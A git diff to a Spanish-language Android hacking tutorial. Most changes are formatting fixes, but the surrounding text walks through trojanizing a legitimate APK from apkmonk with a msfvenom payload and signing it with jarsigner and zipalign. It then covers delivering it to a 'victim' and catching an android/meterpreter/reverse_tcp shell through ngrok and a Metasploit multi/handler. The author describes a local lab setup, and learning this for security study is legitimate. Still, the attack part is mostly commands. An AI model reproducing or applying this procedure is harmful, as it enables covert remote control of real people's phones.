@@ -189,7 +189,7 @@ Lo primero explicar esto, cuando digo APK maliciosa **"original"**, lo que vamos
 
 ![keystore](/images/apuntes/HackingAndroid/keystore.png)
 
-* Ahora con la utilidad ```"jarsigner"``` (que también debe venir preinstalada) vamos a firmar la app:
+* Ahora con la utilidad **"jarsigner"** (que también debe venir preinstalada) vamos a firmar la app:
   * ```jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore "nombre de la key que hemos creado" "el nombre de la app con nuestro código malicioso" "el alias que le pusimos a la key"```
     * -sigalg => Le decimos el algoritmo que va a usar para la firma.
     * -digestalg => Le indicamos un algoritmo de resumen.
@@ -201,8 +201,8 @@ Lo primero explicar esto, cuando digo APK maliciosa **"original"**, lo que vamos
 
 ![jarsigner](/images/apuntes/HackingAndroid/Firmada.png)
 
-* También tenemos que instalar la utilidad ```"zipalign"``` => ```sudo apt install zipalign -y``` (Esta aplicación lo que hace básicamente es alinear los bytes de la app para que esta consuma menos RAM y vaya más rápida), obviamente es mucho más complejo que esto, pero a muy alto nivel hace eso.
-  * ```zipalign 4 "nombre APK maliciosa" "nombre que queremos ya todo terminado"
+* También tenemos que instalar la utilidad **"zipalign"** => ```sudo apt install zipalign -y``` (Esta aplicación lo que hace básicamente es alinear los bytes de la app para que esta consuma menos RAM y vaya más rápida), obviamente es mucho más complejo que esto, pero a muy alto nivel hace eso.
+  * ```zipalign 4 "nombre APK maliciosa" "nombre que queremos ya todo terminado"```
     * 4 => Le indicamos con la cantidad de bytes que queremos que "se alinee".
     * **¡IMPORTANTE!** => Cuidado con el orden, podemos carganos la APK. Aconsejo hacer una copia antes de realizar este comando.
 
@@ -211,10 +211,10 @@ Lo primero explicar esto, cuando digo APK maliciosa **"original"**, lo que vamos
 <a name="ejecucion-de-exploit-en-la-victima"></a>
 ## Ejecución de exploit en la víctima
 
-Lo primero que debemos hacer es, en este ejemplo, dejar **NGROK** preparado para recibir peticiones TCP (se ve en el apartado "Crear APK maliciosa sencilla).
-Hecho esto debemos crear un payload con ```**msfvenom**``` (se ve en el apartado "Crear APK maliciosa sencilla) en este caso, va a ser con una APK descargada desde **"apkmonk"** y modificándola colocándole nuestro payload.
-Ahora, debemos pasarle a la víctima nuestra APK maliciosa de la forma más ingeniosa que podamos o se nos ocurra. (Al estar en un entorno controlado en red local, simplemente me lo voy a pasar a mi dispositivo)
-Finalmente debemos dejar **Metasploit** a la escucha con el **multi-handler** por el puerto que le indicamos a **NGRO** (el local) para poder recibir la shell de **Meterpreter.**
+Lo primero que debemos hacer es, en este ejemplo, dejar **NGROK** preparado para recibir peticiones TCP (se ve en el apartado [Crear APK maliciosa sencilla](#crear-apk-maliciosa-sencilla).  
+Hecho esto debemos crear un payload con **"msfvenom"** (se ve en el apartado [Crear APK maliciosa sencilla](#crear-apk-maliciosa-sencilla) en este caso, va a ser con una APK descargada desde **"apkmonk"** y modificándola colocándole nuestro payload.  
+Ahora, debemos pasarle a la víctima nuestra APK maliciosa de la forma más ingeniosa que podamos o se nos ocurra. (Al estar en un entorno controlado en red local, simplemente me lo voy a pasar a mi dispositivo)  
+Finalmente debemos dejar **Metasploit** a la escucha con el **multi-handler** por el puerto que le indicamos a **NGROK** (el local) para poder recibir la shell de **Meterpreter.**
 * ```msfconsole``` ó ```msfdb run``` => Para abrir **Metasploit**
 * ```use exploit/multi/handler``` => Para indicar a **Metasploit** que queremos usar el exploit multi-handler para estar a la escucha.
 * ```set payload android/meterpreter/reverse_tcp``` => Le indicamos el payload que vamos a usar (el que configuramos con **msfvenom** en nuestra APK maliciosa)
